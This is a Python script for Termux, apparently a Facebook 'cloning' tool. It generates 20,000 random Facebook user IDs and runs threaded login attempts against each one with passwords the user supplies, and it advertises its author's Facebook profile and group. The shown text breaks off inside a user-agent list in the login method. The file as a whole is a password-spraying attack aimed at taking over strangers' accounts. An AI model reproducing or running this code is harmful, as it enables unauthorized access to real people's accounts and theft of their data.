W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor

logo =                                          """       
 
\033[1;93m  ######     ###    ##     ## #### ########        
 \033[1;92m ##    ##   ## ##   ###   ###  ##  ##     ##    
\033[1;94m  ##        ##   ##  #### ####  ##  ##     ##   
 \033[1;97m######  ##     ## ## ### ##  ##  ########    
\033[1;93m    ## ######### ##     ##  ##  ##   ## 
\033[1;92m ##    ## ##     ## ##     ##  ##  ##    ##    
 \033[1;95m######  ##     ## ##     ## #### ##     ##                                                                                        
    \033[93;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
   \033[1;91m ========={ \033[1;92mAUTHER 🔥 CREATED SAMIR👈FOR ZARYAN OO  👿\033[1;91m }=========                                  
\033[1;90m═══════════════════════════════════════════════════════════
\033[1;94m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : FOURKANUDDIN123
\033[1;95m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : Termux command 2022
\033[1;93m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : kazisamir4
\033[1;97m [\033[1;94m✯\033[1;91m] \033[1;92mNOTE : JOIN FACEBOOK GROUP FOR MORE
\033[1;97m [\033[1;94m✯\033[1;91m] \033[1;92mMETHOD : 1
\033[1;90m═══════════════════════════════════════════════════════════
    """


class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print("")
		print("\033[1;93m Note :  FOR FREE APROVOL PLEASE FOLLOW MY FROPILE 💔✌️")
		print("╚════════════════════════════════════════════════════╝")
		
		
		print("")
		print("\033[1;32m [1] FIRST FOLLOW MY profile 👈 ")
		print("\033[1;35m [2] Exit")
		print("")
		SAMIR = input("\n\033[1;31m  Chose  \033[1;32m")
		if SAMIR in ["", " "]:
			exit()
		elif SAMIR in ["2", "02"]:
			print("    Thanks♥️✌")
			exit()
		elif SAMIR in ["1", "01"]:
			os.system("xdg-open https://www.facebook.com/FOURKANUDDIN123 ")
			print("")
			time.sleep(2.0)
			print("\033[1;33m    Checking Subsacribetion")
			print("")
			input("\n\033[1;32m  Type Your Real Name \033[1;36m")
			time.sleep(2.1)
			print("")
			print("\033[1;32m Done ")
			time.sleep(2.0)
			os.system("clear")
		print(logo)
		print(' \033[1;97m[✯]NOTE : OPEN ACCOUNT IN OFFICIAL FACEBOOK \033[0m')
		print(' \033[1;97m[✯]NOTE : BEFORE OPENING ACCOUNT CLEAR DATA OF FB \033[0m')
		print(' \033[1;97m[✯]NOTE : CP IDS ALSO JUST NOW OPEN 👿 \033[0m')
		print("")
		print("%s [%s1%s]%s SPECIAL CLONING%s[OPEN-IDZ]"%(P,G,R,Y,B))
		print(" \033[1;96m[2] EXIT")
		__DOD = input("\n\033[0;91m>>> \033[0;92m CHOOSE \033[0m: ")
		if __DOD in ["", " "]:
			Main()
		elif __DOD in ["1", "01"]:
			self.fbtua()
		else:
			exit()

	def fbtua(self):
		
		x = 111111111

		xx = 999999999

		idx = "100000"


		try:

			for n in range(20000):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL IDS CRACKING -> \033[0;92m%s\033[0;92m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				
				print("%s NOTE : %sFOR OPEN IDZ USE 👉 123456"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print(logo)
				print("     \033[0;93m   FREE MODE ACTIVATE")
				print("\n\033[0;94m [+] BRUTE HAS BEEN START")
				print(" \033[0;96m[+] Note: FOLLOW FROPILE(FOUEKANUDDIN123) FOR Termux command 2022😱 ")
				print(" [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
				print("\033[0;94m----------------------------------------------")
				print("\n")
				print("\033[0;97m")

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;
